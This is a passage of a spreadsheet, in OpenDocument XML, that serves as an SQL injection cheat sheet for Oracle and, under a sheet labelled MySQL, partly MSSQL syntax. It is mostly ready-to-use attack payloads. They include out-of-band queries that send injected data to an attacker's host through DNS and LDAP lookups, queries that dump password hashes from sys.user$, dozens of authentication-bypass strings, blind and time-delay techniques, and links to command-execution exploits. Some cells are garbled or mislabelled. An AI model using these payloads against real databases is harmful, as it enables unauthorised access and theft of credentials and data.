            <text:p>?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)</text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:style-name="ce13"/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="17">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>7 – Queries Only</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;</text:p>
            <text:p>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;</text:p>
            <text:p>SELECT version FROM v$instance;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
            <text:p>– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" office:value-type="string" calcext:value-type="string">
            <text:p>–</text:p>
            <text:p>SELECT 1 FROM dual — comment</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current User</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM dual</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Users</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT username FROM all_users ORDER BY username;</text:p>
            <text:p>SELECT name FROM sys.user$; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
            <text:p>&lt;= 10g.  astatus tells you if acct is locked</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT username FROM all_users;</text:p>
            <text:p>SELECT name, password, astatus FROM sys.user$ --priv &lt;= 10g</text:p>
            <text:p>SELECT name,spare4 FROM sys.user$ --priv &lt;= 11g</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Privileges</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM session_privs; — current privs</text:p>
            <text:p>SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;</text:p>
            <text:p>SELECT grantee FROM dba_sys_privs WHERE privilege = ‘</text:p>
            <text:p>SELECT ANY DICTIONARY’; — priv, find users with particular priv</text:p>
            <text:p>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Curent Database</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT global_name FROM global_name;</text:p>
            <text:p>SELECT name FROM v$database;</text:p>
            <text:p>SELECT instance_name FROM v$instance;</text:p>
            <text:p>SELECT SYS.DATABASE_NAME FROM DUAL;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Databases</text:p>
            <text:p>Also query TNS listener for other databases.  See <text:a xlink:href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html" xlink:type="simple">tnscmd</text:a> (services | status).</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT DISTINCT owner FROM all_tables; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;</text:p>
            <text:p>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find columns from table name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Tables</text:p>
            <text:p>— NB: table names are upper case</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_name FROM all_tables;</text:p>
            <text:p>SELECT owner, table_name FROM all_tables;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables from Column Name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Row (ex 9 row)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Char (ex char 3)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT substr(‘abcd’, 3, 1) FROM dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bitwise AND</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT bitand(6,2) FROM dual; — returns 2</text:p>
            <text:p>SELECT bitand(6,1) FROM dual; — returns0</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ASCII → Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT chr(65) FROM dual; — returns A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Char → ASCII</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ascii(‘A’) FROM dual; — returns 65</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Casting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CAST(1 AS char) FROM dual;</text:p>
            <text:p>SELECT CAST(’1′ AS int) FROM dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘A’ || ‘B’ FROM dual; — returns AB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF statement</text:p>
            <text:p>— doesn’t play well with SELECT statements</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CASE statement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1</text:p>
            <text:p>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 0x09120911091 FROM dual;</text:p>
            <text:p>SELECT chr(65) || chr(66) FROM dual; — returns AB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay (priv)...can’t seem to embed in a select</text:p>
            <text:p><text:span text:style-name="T1">– Also see </text:span><text:span text:style-name="T1"><text:a xlink:href="http://technet.microsoft.com/en-us/library/cc512676.aspx" xlink:type="simple">Heavy Queries</text:a></text:span><text:span text:style-name="T1"> to create a time delay</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BEGIN DBMS_LOCK.SLEEP(5); END;</text:p>
            <text:p>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow</text:p>
            <text:p>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow</text:p>
            <text:p>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DNS requests</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;</text:p>
            <text:p>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Exec</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" xlink:type="simple">Javacan</text:a> be used to execute commands if it’s installed.<text:a xlink:href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql" xlink:type="simple">ExtProc</text:a> can sometimes be used too, though it normally failed</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local File Access</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" xlink:type="simple">UTL_FILE</text:a> can sometimes be used.  Check that the following is non-null:</text:p>
            <text:p>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<text:a xlink:href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" xlink:type="simple">Java</text:a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP Address</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT UTL_INADDR.get_host_name FROM dual;</text:p>
            <text:p>SELECT host_name FROM v$instance; --priv</text:p>
            <text:p>SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address</text:p>
            <text:p>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Location of DB files</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM V$DATAFILE;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Get all tablenames in one string</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>elect rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables –  when using union based SQLI with only one row</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Blind SQLi in ORDER BY clause</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end — you must know 2 column names with the same datatype</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SYSTEM</text:p>
            <text:p>SYSAUX</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Oracle system tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ALL_CATALOG</text:p>
            <text:p>ALL_COL_COMMENTS</text:p>
            <text:p>ALL_CONSTRAINTS</text:p>
            <text:p>ALL_CONS_COLUMNS</text:p>
            <text:p>ALL_DB_LINKS</text:p>
            <text:p>ALL_ERRORS</text:p>
            <text:p>ALL_INDEXES</text:p>
            <text:p>ALL_IND_COLUMNS</text:p>
            <text:p>ALL_LOBS</text:p>
            <text:p>ALL_OBJECTS</text:p>
            <text:p>ALL_OBJECT_TABLES</text:p>
            <text:p>ALL_SEQUENCES</text:p>
            <text:p>ALL_SNAPSHOTS</text:p>
            <text:p>ALL_SOURCE</text:p>
            <text:p>ALL_sYNONYMS</text:p>
            <text:p>ALL_TABLES</text:p>
            <text:p>ALL_TAB_COLUMNS</text:p>
            <text:p>ALL_TAB_COL_STATISTICS</text:p>
            <text:p>ALL_TAB_COMMENTS</text:p>
            <text:p>ALL_TRIGGERS</text:p>
            <text:p>ALL_TRIGGER_COLS</text:p>
            <text:p>ALL_TYPES</text:p>
            <text:p>ALL_UPDATABLE_COLUMNS</text:p>
            <text:p>ALL_USERS</text:p>
            <text:p>ALL_VIEWS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Oracle system tables continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">DATABASE_COMPATIBLE_LEVEL</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_DB_LINKS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ERRORS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_OBJECTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ROLES</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ROLE_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_SOURCE</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TABLESPACES</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TAB_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TRIGGERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TS_QUOTAS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_USERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_VIEWS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DICTIONARY</text:span></text:p>
            <text:p><text:span text:style-name="T3">DICT_COLUMNS</text:span></text:p>
            <text:p><text:span text:style-name="T3">GLOBAL_NAME</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_DATABSE_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_INSTANCE_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_SESSION_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PRODUCT_COMPONENT_VERSION</text:span></text:p>
            <text:p><text:span text:style-name="T3">ROLE_TAB_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">SESSION_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">SESSION_ROLES</text:span></text:p>
            <text:p><text:span text:style-name="T3">SYSTEM_PRIVILEGE_MAP</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGE_MAP</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">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1" table:number-rows-repeated="1048459">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
      </table:table>
      <table:table table:name="MySQL" table:style-name="ta1">
        <table:table-column table:style-name="co4" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co5" table:default-cell-style-name="ce12"/>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.1 – Information gathering</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>typical SQLi test (auth bypass), test in user field, pass field, and both together</text:p>
            <text:p/>
            <text:p>You can use as many apostrophes and quotations as you want as long as they pair up.</text:p>
            <text:p>It is also possible to continue the statement after the chain of quotes.</text:p>
            <text:p>Quotes escape quotes.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T2">-’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' ‘</text:span></text:p>
            <text:p><text:span text:style-name="T2">'&amp;’</text:span></text:p>
            <text:p><text:span text:style-name="T2">'^’</text:span></text:p>
            <text:p><text:span text:style-name="T2">'*’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’-’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘--’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’ ‘</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’&amp;’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’^’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’*’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR '1</text:span></text:p>
            <text:p>' OR 1=’1</text:p>
            <text:p>' OR ‘1’=’1</text:p>
            <text:p>' OR ‘1=1</text:p>
            <text:p><text:span text:style-name="T2">' OR 1=1 #</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR 1 -- -</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR ('x'='x</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR (‘x’)=(‘x</text:span></text:p>
            <text:p><text:span text:style-name="T2">')) OR ((‘x’))=((‘x</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR username LIKE '%admin%</text:span></text:p>
            <text:p><text:span text:style-name="T2">a' OR 1=1 --</text:span></text:p>
            <text:p><text:span text:style-name="T2">1’ OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">'='</text:span></text:p>
            <text:p><text:span text:style-name="T2">'LIKE'</text:span></text:p>
            <text:p><text:span text:style-name="T2">'=0--+</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”-”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”--”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”&amp;”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”^”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”*”</text:span></text:p>
            <text:p><text:span text:style-name="T2">" OR "" = "</text:span></text:p>
            <text:p>" OR 1 = 1 -- -</text:p>
            <text:p><text:span text:style-name="T2">" OR 1=1 #</text:span></text:p>
            <text:p><text:span text:style-name="T2">" OR "x"="x</text:span></text:p>
            <text:p><text:span text:style-name="T2">") OR ("x"="x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“) OR (“x”)=(“x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“)) OR ((“x”))=((“x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">“) OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">OR true --</text:span></text:p>
            <text:p><text:span text:style-name="T2">a" OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">1 OR 1=1</text:span></text:p>
            <text:p>OR 1=1 –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>String testing for query: SELECT * FROM Table WHERE id = ‘1’;</text:p>
            <text:p/>
            <text:p>FALSE (invalid query)</text:p>
            <text:p>TRUE (valid query)</text:p>
            <text:p>FALSE</text:p>
            <text:p>TRUE</text:p>
            <text:p>FALSE</text:p>
            <text:p>TRUE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p/>
            <text:p>'</text:p>
            <text:p>“</text:p>
            <text:p>'</text:p>
            <text:p>"</text:p>
            <text:p>""</text:p>
            <text:p>\</text:p>
            <text:p>\\</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>numeric testing for query: select * from table where id = 1;</text:p>
            <text:p/>
            <text:p>TRUE</text:p>
            <text:p>FALSE</text:p>
            <text:p>TRUE</text:p>
            <text:p>FALSE</text:p>
            <text:p>1 if vulnerable</text:p>
            <text:p>0 if vulnerable</text:p>
            <text:p>56 if vulnerable</text:p>
            <text:p>1 if not vulnerable</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p/>
            <text:p/>
            <text:p>AND 1</text:p>
            <text:p>AND 0</text:p>
            <text:p>AND true</text:p>
            <text:p>AND false</text:p>
            <text:p>1-false</text:p>
            <text:p>1-true</text:p>
            <text:p>1*56</text:p>
            <text:p>1*56</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check for privs (some require priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">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span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT file_priv FROM mysql.user WHERE user = 'username';</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server version:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select @@version) –</text:p>
            <text:p>VERSION()</text:p>
            <text:p>@@global.version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version detection using MySQL Special Exec Comment Syntax</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*!500005#*//*!400004#*//*!300003#*/</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select @@servername) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get current username:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce19" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select USER_NAME()) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get current database name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select DB_NAME()) –</text:p>
            <text:p>Database()</text:p>
            <text:p>Schema()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Additional info with LIKE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1 AND user LIKE “%root%”</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Find the current query</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT info FROM information_schema.processlist</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell table:style-name="ce13"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.2 – Database structure</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>MSSQL is a very friendly database… you can get all db structures via normal select. Fist of all you can take the list of databases on the server.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>select * from master..sysdatabases</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Only the first result:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get all records we need to implement something in sql like the limit keyword on mysql ($XX$ is the row number):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
